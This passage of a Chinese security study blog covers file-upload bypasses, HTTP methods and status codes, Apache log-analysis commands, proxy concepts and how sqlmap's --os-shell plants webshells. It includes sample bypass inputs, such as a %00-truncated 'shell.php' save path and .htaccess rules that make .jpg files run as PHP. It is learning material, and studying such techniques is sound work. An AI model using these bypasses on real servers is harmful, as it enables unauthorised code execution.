$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="property">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">move_uploaded_file</span>($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于是白名单限制了上传文件类型，因此我们无法在文件名处做文章。但最终<code>move_uploaded_file()</code>的目标目录是我们可控的，我们可以将POST传入的<code>save_path</code>改为<code>../upload/shell.php%00</code>，这样后面的内容就会被截断掉，这就导致了任意文件上传</p>
<p>还要注意的是<code>%00</code>是url编码，在以POST传参时应该使用burpsuite对其进行url decode，或者修改hex值为00；而当GET传参时因为浏览器会做一遍url decode，所以直接传<code>%00</code>即可。</p>
<h3 id="3-1-4-利用-htaccess解析"><a href="#3-1-4-利用-htaccess解析" class="headerlink" title="3.1.4 利用.htaccess解析"></a>3.1.4 利用.htaccess解析</h3><blockquote>
<p>.htaccess文件(或者”<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/tsecc?from_column=20065&from=20065">分布式配置</a>文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
</blockquote>
<p>利用.htaccess的条件：Apache中配置<code>AllowOverride All</code></p>
<p>.htaccess文件可以配置将特定的文件按规定的文件类型进行解析，可以用以下两种方式来配置：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>

<p>这一种采用正则匹配，只要文件名为test的文件都将被作为php文件解析</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span> application/x-httpd-php .<span class="property">jpg</span></span><br></pre></td></tr></table></figure>

<p>第二种是将.jpg文件都作为php文件解析</p>
<p>这样我们如果能将.htaccess上传到服务器的话，就可以再根据我们自己设定的规则来解析上传的文件，以此来绕过上传过滤</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>常见的文件上传的检测和绕过方式基本是以上几种。在实战或CTF比赛中往往是几种类型的结合，因此绕过也需要几种方式的结合。</p>
<p>首先我认为最重要的是前期的信息收集，服务器的类型、版本，使用的脚本语言、版本，只要做到对这些很清楚后才能考虑之后能否利用一些如%00截断、服务器解析漏洞来进行文件上传。</p>
<p>在测试时，一般我们都先要fuzz看一下检测是哪种类型，是前端还是后端？黑名单还是白名单？上传后的shell能否被成功执行？是否有文件内容的检测？</p>
<p>如果是黑名单的话，就要尝试各种特殊文件名（php、Php、PHP、pht、php5、phtml），或者在扩展名后添加空格、::$DATA、.等字符，再或者是尝试上传.htaccess</p>
<p>如果是白名单，就要看是否可以使用%00截断，或者利用服务器的解析漏洞。如果真的过滤很死的话，不妨再找一下目标的文件包含漏洞，尝试利用文件包含来解析图片马。</p>
<p>个人认为现在文件上传在代码层除了逻辑问题外已经很少有漏洞了，大多数情况下都是利用服务器解析漏洞等来getshell，这篇文章也只是作为自己入门文件上传的总结。如果有错误，请各位师傅指正。</p>
<h2 id="web日志分析post请求"><a href="#web日志分析post请求" class="headerlink" title="web日志分析post请求"></a>web日志分析post请求</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HaiwenChen/article/details/137009664">https://blog.csdn.net/HaiwenChen/article/details/137009664</a></p>
<p>HTTP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS    用于请求获得由URL标识的资源,在请求响应的通信过程中可以使用的功能选项。通过这个方法,客户端可以在采取具体资源请求前,决定对该资源采取何种必要的措施,或者了解服务器的性能</span><br><span class="line">GET    用于获取请求页面的指定消息(以实体的格式)。如果请求资源为动态脚本(除HTML),那么返回文本是Web容器解析后的HTML源代码,而不是源文件</span><br><span class="line">POST    与GET方法相似,但最大的区别在于GET方法没有请求内容,而POST方法是有请求内容的。POST方法多用于向服务器发送大量的数据。GET方法虽然也能发送数据,但是有大小(长度)的限制,并且GET方法会将发送的数据显示在浏览器端,而POST方法则不会,所以安全性相对高一些。如上传文件、提交留言等,只要是向服务器传输大量的数据,通常会使用POST方法(登录也是POST方法)</span><br><span class="line">HEAD    除服务器不能在响应里返回消息主体外,其他都与GET方法相同。它经常被用来测试超文本链接的有效性、可访问性和最近的改变。攻击者编写扫描工具时,就常用此方法,因为它只测试资源是否存在,而不用返回消息主题,所以处理的速度快</span><br><span class="line">DELETE    用于请求源服务器删除请求的指定资源。服务器一般会关闭此方法,这是因为客户端可以进行删除文件的操作,属于危险方法</span><br><span class="line">TRACE    被用于激发一个远程应用层的请求消息回路,即回显服务器收到的请求。它允许客户端了解数据被请求链的另一端接收的情况,并且利用这些数据信息进行测试或诊断,但此方法很少使用</span><br><span class="line">PUT    用于将数据发送到服务器以创建或更新资源,可以用上传的内容替换目标资源中的所有当前内容。它将包含的元素放在所提供的URI(统一资源标识)下,如果URI指示的是当前资源,则会被改变;如果URI未指示当前资源,则服务器可以使用该URI创建资源。它属于危险方法,一旦开启,就会允许任意人员向服务器上传文件</span><br><span class="line">CONNECT    用来建立给定URI的服务器隧道。它通过简单的TCP/IP隧道更改请求连接,通常使用解码的HTTP代理来进行SSL编码的通信(HTTPS)</span><br><span class="line">其余HTTP请求方法</span><br><span class="line">请求方法    说明</span><br><span class="line">PATCH    HTTP的RFC2616原本定义用于上传数据的方法只有POST和PUT,但是考虑到两者的不足,就增加了 PATCH方法。它是对PUT方法的补充,用来对已知资源进行局部更新</span><br><span class="line">MOVE    请求服务器将指定的页面移至另一个网络地址,它属于危险方法</span><br><span class="line">COPY    请求服务器将指定的页面复制至另一个网络地址,它属于危险方法</span><br><span class="line">LINK    请求服务器建立链接关系</span><br><span class="line">UNLINK    断开链接关系</span><br><span class="line">WRAPPED    允许客户端发送经过封装的请求</span><br><span class="line">Extension-method    在不改动协议的前提下,可增加另外的方法</span><br></pre></td></tr></table></figure>

<p>状态码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">1XX    消息    表示请求已被接受,需要继续处理。这类响应是临时响应,只包含状态行和某些可选的响应头信息,并以空行结束。由于HTTP/1.0中没有定义任何1XX状态码,所以除非在某些试验条件下,服务器禁止向此类客户端发送1XX响应</span><br><span class="line">2XX    成功    表示请求已成功被服务器接收、理解并接受</span><br><span class="line">3XX    重定向    表示需要客户端采取进一步的操作才能完成请求。通常这些状态码用来重定向,后续的请求地址(重定向目标)在本次响应的 Location域中指明</span><br><span class="line">4XX    请求错误    表示客户端可能发生错误,妨碍了服务器进行处理</span><br><span class="line">5XX    服务器错误    表示服务器在处理请求的过程中有错误或异常状态发生,也有可能是服务器意识到以当前的软/硬件资源无法完成对请求的处理</span><br><span class="line">1XX 消息</span><br><span class="line">100 Continue：客户端应当继续发送请求。这个临时响应是用来通知客户端其部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，则忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。</span><br><span class="line">101 Switching Protocols：服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade消息头中定义的那些协议。只有在切换新的协议更有利时才会采取类似措施，如切换新的HTTP版本比旧版本更有优势，或者切换一个实时且同步的协议以传送利用此类特性的资源。</span><br><span class="line">102 Processing：由WebDAV(RFC 2518)扩展的状态码，代表该处理将被继续执行。</span><br><span class="line"></span><br><span class="line">2XX 成功</span><br><span class="line">200 OK：请求已成功，请求所希望的响应头或数据体将随此响应返回。出现此状态码表示状态正常。</span><br><span class="line">201 Created：请求已经被实现，有一个新的资源已经依据请求的需要而建立，且其URI已经随Location头信息返回。如果需要的资源无法及时建立，则应返回“202 Accepted”。</span><br><span class="line">202 Accepted：服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求也可能不被执行。</span><br><span class="line">203 Non-Authoritative Information：服务器已成功处理了请求，但返回的实体头部元信息不是原始服务器有效的确定集合，而是来自本地或第三方的复制。当前的信息可能是原始版本的子集或超集，如包含资源的元数据可能导致原始服务器知道元信息的超集。使用此状态码不是必需的，而且只有在响应不使用此状态码就会返回200 OK的情况下才适用。</span><br><span class="line">204 No Content：服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。</span><br><span class="line">205 Reset Content：服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要用于接收用户输入后就能立即重置表单，令用户能够轻松地开始另一次输入。</span><br><span class="line">206 Partial Content：服务器已经成功处理了部分GET请求。FlashGet或迅雷的HTTP下载工具都使用此类响应实现断点续传，或者将一个大文档分解为多个下载段同时下载。</span><br><span class="line">207 Multi-Status：由WebDAV(RFC 2518)扩展的状态码，代表此后的消息体将是个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</span><br><span class="line"></span><br><span class="line">3XX 重定向</span><br><span class="line">300 Multiple Choices：被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。</span><br><span class="line">301 Moved Permanently：被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。</span><br><span class="line">302 Move Temporarily：请求的资源临时从不同的URI进行响应请求。由于这样的重定向是临时的，所以客户端应当继续向原有地址发送以后的请求。只有在Cache-control或Expires中进行指定的情况下，这个响应才是可缓存的。</span><br><span class="line">303 See Other：对应当前请求的响应可以在另一个URI上被找到，而且客户端应当采用GET方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求(重定向)可能被缓存。</span><br><span class="line">304 Not Modified：如果客户端发送了一个带条件的GET请求且被允许，而文档的内容（自上次访问以来或根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，故始终以消息头后的第一个空行结尾。</span><br><span class="line">305 Use Proxy：被请求的资源必须通过指定的代理才能被访问。Location域中将给出指定代理所在的URI信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应的资源。只有原始服务器才能建立305响应。</span><br><span class="line">306 Switch Proxy：在最新版的规范中，306状态码已经不再被使用。</span><br><span class="line">307 Temporary Redirect：请求的资源临时从不同的URI响应请求。</span><br><span class="line"></span><br><span class="line">4XX 请求错误</span><br><span class="line">400 Bad Request：①语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求：②请求参数有误。</span><br><span class="line">401 Unauthorized：当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。如果当前请求已经包含了Authorization证书，那么401响应代表服务器验证已经拒绝了这些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。</span><br><span class="line">402 Payment Required：该状态码是为可能的需求而预留的。</span><br><span class="line">403 Forbidden：服务器已经理解请求，但拒绝执行。与401响应不同，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然如果它不希望让客户端获得任何信息，服务器也可以返回一个404响应。</span><br><span class="line">404 Not Found：请求失败，请求所希望得到的资源未在服务器上被发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。如果服务器知道情况，就应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久不可用了，而且没有任何可以跳转的地址。404状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或没有其他适合的响应可用的情况下。出现这个错误的最大原因是服务器端没有这个页面。</span><br><span class="line">405 Method Not Allowed：请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow头信息用以表示当前资源能够接受请求方法的列表。鉴于PUT方法、DELETE方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或在默认配置下不允许使用上述的请求方法，对于此类请求方法均会返回405错误。</span><br><span class="line">406 Not Acceptable：请求资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。</span><br><span class="line">407 Proxy Authentication Required：与401响应类似，只是客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个Poxy-Authenticate用以进行身份询问。客户端可以返回一个Proxy–Authorization信息头用以验证。</span><br><span class="line">408 Request Timeout：请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这个请求而无须进行任何更改。</span><br><span class="line">409 Conflict：由于和被请求资源的当前状态之间存在冲突，请求无法完成。这个代码只允许在这种的情况下才能被使用，即用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。</span><br><span class="line">410 Gone：被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或无法确定这个状况是不是永久的，就应该使用404状态码。除非额外说明，否则这个响应是可缓存的。</span><br><span class="line">411 Length Required：服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效Content-length头后，客户端可以再次提交该请求。</span><br><span class="line">412 Precondition Failed：服务器验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息(请求头字段数据)中设置先决条件，以避免该请求被应用到其希望的内容以外的资源上。</span><br><span class="line">413 Request Entity Too Large：服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或能够处理的范围。在此种情况下，服务器可以关闭连接以免客户端继续发送此请求。</span><br><span class="line">414 Request-URI Too Long：请求的URI长度超过了服务器能够解释的长度，因此，服务器拒绝对该请求提供服务，这种情况比较少见。</span><br><span class="line">415 Unsupported Media Type：对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此，请求被拒绝。</span><br><span class="line">416 Requested Range Not Satisfiable：如果请求中包含了Range请求头，并且Range中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义IF-Range请求头，那么服务器就应当返回416状态码。</span><br><span class="line">417 Expectation Failed：在请求头Expect中指定的预期内容无法被服务器满足，或者当这个服务器是一个代理服务器时，它可证明在当前路由的下一个节点上，Expect的内容无法被满足。</span><br><span class="line">421 Too Many Connections：从当前客户端所在的IP地址查到服务器的连接数超过了服务器许可的最大范围。通常这里的IP地址指的是从服务器上看到的客户端地址(如用户的网关或代理服务器地址)，在这种情况下，连接数的计算可能涉及不止一个终端用户。</span><br><span class="line">422 Unprocessable Entity：请求格式正确，但由于含有语义错误而无法响应。</span><br><span class="line">423 Locked：当前资源被锁定。</span><br><span class="line">424 Failed Dependency：由于之前的某个请求发生的错误导致当前请求失败，如PROPPATCH。</span><br><span class="line">425 Too Early：表示服务器不愿意冒风险来处理该请求，因为处理该请求可能会被“重放”，从而造成潜在的重放攻击。</span><br><span class="line">426 Upgrade Required：客户端应当切换到TLS/1.0。</span><br><span class="line">449 Retry With：表示请求应当在执行完适当的操作后进行重试。</span><br><span class="line">451 Unavailable For Legal Reasons：表示该请求因法律原因不可用。</span><br><span class="line"></span><br><span class="line">5XX 服务器错误</span><br><span class="line">500 Internal Server Error：服务器遇到了一个未曾预料的状况，导致无法完成对请求的处理。一般来说，这个问题会在服务器端的源代码出现错误时出现。</span><br><span class="line">501 Not Implemented：当服务器无法识别请求的方法，并且无法支持其对任何资源的请求时，服务器不支持当前请求所需要的某个功能。</span><br><span class="line"></span><br><span class="line">502 Bad Gateway：作为网关或代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</span><br><span class="line"></span><br><span class="line">503 Service Unavailable：由于临时的服务器维护或过载，服务器当前无法处理请求这个状况是临时的，并且将在一段时间后恢复。如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式进行处理。</span><br><span class="line">504 Gateway Timeout：作为网关或代理工作的服务器尝试执行请求时，未能及时从上游服务器(URI标识出的服务器，如HTTP、FTP、LDAP)或辅助服务器(如DNS)得到响应。</span><br><span class="line">505 HTTP Version Not Supported：服务器不支持，或者拒绝支持在请求中使用的HTTP版本。这表示服务器不能或不愿意使用与客户端相同的版本。响应中应当包含一个描述了版本不被支持的原因，以及服务器支持哪些协议的实体。</span><br><span class="line">506 Variant Also Negotiates：由《透明内容协商协议》(RFC 2295)扩展，代表服务器存在内部配置错误，即被请求的协商变元资源被配置在透明内容协商中使用，因此它在协商处理中不是一个合适的重点。</span><br><span class="line"></span><br><span class="line">507 Insufficient Storage：服务器无法存储完成请求所必需的内容。这个状况被认为是临时的。</span><br><span class="line"></span><br><span class="line">509 Bandwidth Limit Exceeded：服务器达到带宽限制。虽然这不是一个官方的状态码，但仍被广泛使用。</span><br><span class="line">510 Not Extended：获取资源所需要的策略，但没有被满足。</span><br><span class="line">600 Unparseable Response Headers：源站没有返回响应头部，只返回实体内容。它是个特殊的服务器错误状态码。</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_67503304/article/details/127527736">https://blog.csdn.net/weixin_67503304/article/details/127527736</a></p>
<p>linux系统Apache日志分析技巧：<br>1、列出当天访问次数最多的IP命令：</p>
<p> cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</p>
<p>2、查看当天有多少个IP访问：</p>
<p> awk ‘{print $1}’ log_file|sort|uniq|wc -l</p>
<p>3、查看某一个页面被访问的次数：</p>
<p> grep “&#x2F;index.php” log_file | wc -l</p>
<p>4、查看每一个IP访问了多少个页面：</p>
<p> awk ‘{++S[$1]} END {for (a in S) print a,S[a]}’ log_file</p>
<p>5、将每个IP访问的页面数进行从小到大排序：</p>
<p> awk ‘{++S[$1]} END {for (a in S) print S[a],a}’ log_file | sort -n</p>
<p>6、查看某一个IP访问了哪些页面：</p>
<p> grep ^111.111.111.111 log_file| awk ‘{print $1,$7}’</p>
<p>7、去掉搜索引擎统计当天的页面：</p>
<p> awk ‘{print $12,$1}’ log_file | grep ^&quot;Mozilla | awk ‘{print $2}’ |sort | uniq | wc -l</p>
<p>8、查看2021年6月21日14时这一个小时内有多少IP访问:</p>
<p> awk ‘{print $4,$1}’ log_file | grep 21&#x2F;Jun&#x2F;2021:14 | awk ‘{print $2}’| sort | uniq | wc -l</p>
<p>日志统计分析技巧<br>统计爬虫：</p>
<p>grep -E ‘Googlebot|Baiduspider’ &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk ‘{ print $1 }’ | sort | uniq</p>
<p>统计浏览器：</p>
<p>cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | grep -v -E ‘MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon’ | sort | uniq -c | sort -r -n | head -n 100</p>
<p>IP 统计：</p>
<p>grep ‘23&#x2F;May&#x2F;2019’ &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk ‘{print $1}’ | awk -F’.’ ‘{print $1”.”$2”.”$3”.”$4}’ | sort | uniq -c | sort -r -n | head -n 10</p>
<p>统计网段：</p>
<p>cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk ‘{print $1}’ | awk -F’.’ ‘{print $1”.”$2”.”$3”.0”}’ | sort | uniq -c | sort -r -n | head -n 200</p>
<p>统计域名：</p>
<p>cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk ‘{print $2}’|sort|uniq -c|sort -rn|more</p>
<p>HTTP Status：</p>
<p>cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk ‘{print $9}’|sort|uniq -c|sort -rn|more</p>
<p>URL 统计：</p>
<p>cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk ‘{print $7}’|sort|uniq -c|sort -rn|more</p>
<p>文件流量统计：</p>
<p>cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk ‘{sum[$7]+&#x3D;$10}END{for(i in sum){print sum[i],i}}’|sort -rn|more grep ‘ 200 ‘ &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk ‘{sum[$7]+&#x3D;$10}END{for(i in sum){print sum[i],i}}’|sort -rn|more</p>
<p>URL访问量统计：</p>
<p>cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk ‘{print $7}’ | egrep ‘?|&amp;’ | sort | uniq -c | sort - rn | more</p>
<p>脚本运行速度：查出运行速度最慢的脚本</p>
<p>grep -v 0$ &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk -F ‘&quot; ‘ ‘{print $4” “ $1}’ web.log | awk ‘{print $1” “$8}’ | sort -n -k 1 -r | uniq &gt; &#x2F;tmp&#x2F;slow_url.txt</p>
<p>IP, URL 抽取：</p>
<p>tail -f &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | grep ‘&#x2F;test.html’ | awk ‘{print $1” “$7}’</p>
<p>刪除一个月前的日志：</p>
<p>rm -f &#x2F;www&#x2F;logs&#x2F;access.log.$(date -d ‘-1 month’ +’%Y-%m’)*</p>
<h2 id="thinkphp特征和漏洞"><a href="#thinkphp特征和漏洞" class="headerlink" title="thinkphp特征和漏洞"></a>thinkphp特征和漏洞</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/milu_Sec/article/details/135307628">https://blog.csdn.net/milu_Sec/article/details/135307628</a></p>
<h2 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h2><p>正向代理与反向代理的区别与联系<br>在网络通信中，有时候我们不能直接访问目标服务器，或者目标服务器不能直接响应客户端的请求，这时候就需要使用代理服务器来作为中间人，帮助我们完成请求和响应的转发。根据代理的对象不同，我们可以把代理分为正向代理和反向代理。那么它们有什么区别和联系呢？本文将从以下几个方面来介绍：</p>
<p>什么是正向代理和反向代理<br>正向代理和反向代理的作用和优势<br>正向代理和反向代理的区别和联系<br>如何使用nginx配置正向代理和反向代理<br>什么是正向代理和反向代理<br>正向代理<br>正向代理是指客户端通过代理服务器来访问目标服务器，目标服务器不知道真正的客户端是谁，只知道请求来自于代理服务器。正向代理可以隐藏客户端的真实身份，让客户端访问一些原本无法访问的资源，比如Google、YouTube等。</p>
<p>反向代理<br>反向代理是指客户端通过代理服务器来访问目标服务器集群，客户端不知道真正的目标服务器是哪一个，只知道请求发送到了代理服务器。反向代理可以隐藏目标服务器的真实地址，让目标服务器集群对外提供统一的服务接口，实现负载均衡、安全防护等功能。</p>
<p>正向代理和反向代理的作用和优势<br>正向代理的作用和优势<br>访问原来无法访问的资源，如Google、YouTube等<br>可以做缓存，加速访问资源<br>对客户端访问授权，上网进行认证<br>代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息<br>反向代理的作用和优势<br>保证内网的安全，阻止web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网<br>负载均衡，通过反向代理服务器来优化网站的负载<br>加密&#x2F;SSL加速：将SSL加密工作交由配备了SSL硬件加速器的反向代理来完成<br>提供缓存服务 ，加速客户端访问<br>数据统一压缩 节约带宽<br>为网络带宽不好的网络提供服务<br>统一的访问权限控制<br>正向代理和反向代理的区别和联系<br>区别<br>从定义上看，正向代理是为客户端服务的，反向代理是为目标服务器服务的<br>从对象上看，正向代理隐藏了真实的客户端地址，反向代理隐藏了真实的目标服务器地址<br>从位置上看，正向代理位于客户端和目标服务器之间，反向代理位于目标服务器集群之前<br>联系<br>从功能上看，正向代理和反向代理都是进行请求和响应的转发<br>从结构上看，正向代理和反向代理都需要一个或多个中间人（即proxy）来完成转发任务<br>从协议上看，正向代理和反向代理都可以使用HTTP或HTTPS协议来进行通信</p>
<h2 id="sqlmap-–os-–shell的原理"><a href="#sqlmap-–os-–shell的原理" class="headerlink" title="sqlmap –os –shell的原理"></a>sqlmap –os –shell的原理</h2><p>–os-shell的本质就是写入两个php文件，其中的tmpugvzq.php可以让我们上传文件到网站路径下</p>
<p><img src="/photo/image-20240612234936507.png" alt="image-20240612234936507"></p>
<p>然后<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sqlmap&spm=1001.2101.3001.7020">sqlmap</a>就会通过上面这个php上传一个用于命令执行的tmpbylqf.php到网站路径下，让我们命令执行，并将输出的内容返回sqlmap端。</p>
<p>当<a target="_blank" rel="noopener" href="https://cloud.tencent.com/solution/database?from_column=20065&from=20065">数据库</a>为MySQL，<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/postgresql?from_column=20065&from=20065">PostgreSQL</a>或Microsoft <a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/sqlserver?from_column=20065&from=20065">SQL Server</a>，并且当前用户有权限使用特定的函数。</p>
<p>在mysql、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。那么他创建的这两个函数可以执行系统命令。</p>
<p>在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建</p>
<p>接下来我会通过注入、SQLSERVER数据库、Mysql数据库进行介绍os shell原理。</p>
<p>必要条件：</p>
<ul>
<li>拥有网站的写入权限</li>
<li>Secure_file_priv参数为空或者为指定路径。</li>
</ul>
<p>普通注入–os-shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行。</p>
<p>①知道网站的物理路径。</p>
<p>②网站路径具有写入的权限。</p>
<p>③sqlmap能够跑出数据库。</p>
<p>先写入一个文件上传shell<code>tmpukiwa.php</code>，再通过文件上传shell上传命令执行shell<code>tmpbarxj.php</code>，再利用命令执行shell执行命令</p>
<h2 id="资产梳理过程"><a href="#资产梳理过程" class="headerlink" title="资产梳理过程"></a>资产梳理过程</h2><p><img src="/photo/image-20240612235442119.png" alt="image-20240612235442119"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_72543266/article/details/138631531">https://blog.csdn.net/weixin_72543266/article/details/138631531</a></p>
